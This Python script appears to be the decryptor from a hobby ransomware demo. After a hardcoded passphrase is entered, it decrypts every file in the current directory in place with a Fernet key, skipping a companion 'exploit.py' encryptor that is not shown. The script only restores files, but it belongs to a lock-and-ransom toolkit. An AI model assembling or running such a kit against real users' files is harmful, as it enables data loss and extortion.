import os
from cryptography.fernet import Fernet
from cryptography.exceptions import InvalidToken

files = []
exclude_files = ["exploit.py", "thekey.key", "decrypt.py", os.path.basename(__file__)]

for file in os.listdir():
    if file in exclude_files:
        continue
    if os.path.isfile(file):
        files.append(file)
        
print("Files found for decryption:", files)

if not os.path.exists("thekey.key"):
    print("Error: 'thekey.key' not found in this directory.")
    exit()

with open("thekey.key", "rb") as key:
    secretk = key.read().strip() 
    
phrase = "Dear R00tk1t, I have a good 0p56c!!!!"
userp = input("Enter the SECRET phrase, GGs: \n")

if userp == phrase:
    try:
        cipher = Fernet(secretk)
    except Exception as e:
        print(f"Yo,Error initializing key: {e}. Ensure 'thekey.key' is a valid Fernet key.")
        exit()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        
        try:
            contents_decrypted = cipher.decrypt(contents)
            
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print(f" {file} - Whoa dude, wtf did u du... Successfully unlocked")
            
        except InvalidToken:
            print(f" Failed to decrypt {file}. (File might already be decrypted or corrupted, So sad...)")
        except Exception as e:
            print(f" Oops... unexpected error on {file}: {e}")
else:
    print("I am extremely SORRY... :( ...")
    
    
    
    